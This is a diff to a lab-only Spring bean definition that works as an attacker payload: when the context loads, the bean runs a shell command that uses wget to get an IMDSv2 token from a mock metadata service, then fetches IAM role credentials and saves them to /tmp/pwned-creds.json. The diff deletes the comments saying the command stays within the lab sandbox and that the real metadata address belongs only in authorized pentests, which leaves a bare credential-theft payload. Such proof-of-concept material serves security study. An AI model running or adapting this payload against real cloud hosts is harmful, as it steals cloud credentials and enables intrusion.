@@ -1,4 +1,3 @@
-<?xml version="1.0" encoding="UTF-8"?>
 <!--
   LAB-ONLY "attacker" Spring bean definition.
 
@@ -6,10 +5,6 @@
   gadget would fetch and parse. Spring eagerly instantiates every
   non-lazy bean when the context loads, which is what makes this a code
   execution primitive rather than inert config.
-
-  The command below only talks to the metadata-mock container on the lab's
-  internal docker network and writes output to /tmp inside vuln-app's
-  container -- it does nothing outside this lab's sandbox.
 -->
 <beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -21,15 +16,6 @@
             <list>
                 <value>/bin/sh</value>
                 <value>-c</value>
-                <!--
-                  Demonstrates impact: fetch a token from the mock IMDSv2
-                  service, then use it to fetch mock "credentials", and
-                  write both to a file so the PoC can show what an
-                  attacker would have captured. Replace metadata-mock
-                  with 169.254.169.254 only in a real, authorized pentest
-                  environment -- never point this at infrastructure you
-                  don't own.
-                -->
                 <value>
                     TOKEN=$(wget -q -O- --method=PUT --header="X-aws-ec2-metadata-token-ttl-seconds: 21600" http://metadata-mock:1338/latest/api/token);
                     wget -q -O /tmp/pwned-creds.json --header="X-aws-ec2-metadata-token: $TOKEN" http://metadata-mock:1338/latest/meta-data/iam/security-credentials/lab-instance-role;
